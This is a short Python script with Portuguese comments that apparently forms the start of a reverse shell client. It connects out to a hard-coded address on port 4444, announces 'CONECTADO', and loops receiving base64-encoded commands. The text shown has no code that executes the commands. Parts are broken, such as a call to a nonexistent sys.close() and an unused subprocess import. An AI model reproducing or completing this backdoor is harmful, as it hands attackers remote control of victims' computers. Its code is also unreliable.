import socket
import subprocess
import os, base64
import sys

# COM NO-IP
# IP = socket.gethostbyname("")
IP = "192.168.99.2"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
s.send("CONECTADO")

# descriptografar os dados
def base64_deco(strings):
    return base64.b64decode(strings)

def main():
    while True:
        #dados = s.recv(1024)
        #dados = base64_deco(dados)
        dados = base64_deco(s.recv(1024))
        if dados[:-1] == '/exit':
            sys.close()
            s.close()
